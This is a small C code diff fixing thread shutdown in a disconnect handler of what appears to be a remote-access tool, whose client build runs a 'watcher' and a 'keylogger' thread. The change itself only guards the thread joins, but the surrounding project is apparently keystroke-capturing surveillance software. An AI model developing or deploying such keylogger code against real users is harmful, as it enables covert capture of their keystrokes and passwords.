@@ -353,10 +353,14 @@ void stop_keylogger(struct session_info * session_info) {
 void handle_disconnect(struct session_info * session_info) {
     connection_loop = false;
 #ifdef CLIENT_BUILD
-    session_info->run_watcher = false;
-    pthread_join(session_info->watcher_thread, NULL);
-    session_info->run_keylogger = false;
-    pthread_join(session_info->keylogger_thread, NULL);
+    if (session_info->run_watcher) {
+        session_info->run_watcher = false;
+        pthread_join(session_info->watcher_thread, NULL);
+    }
+    if (session_info->run_keylogger) {
+        session_info->run_keylogger = false;
+        pthread_join(session_info->keylogger_thread, NULL);
+    }
 #endif
 }
 
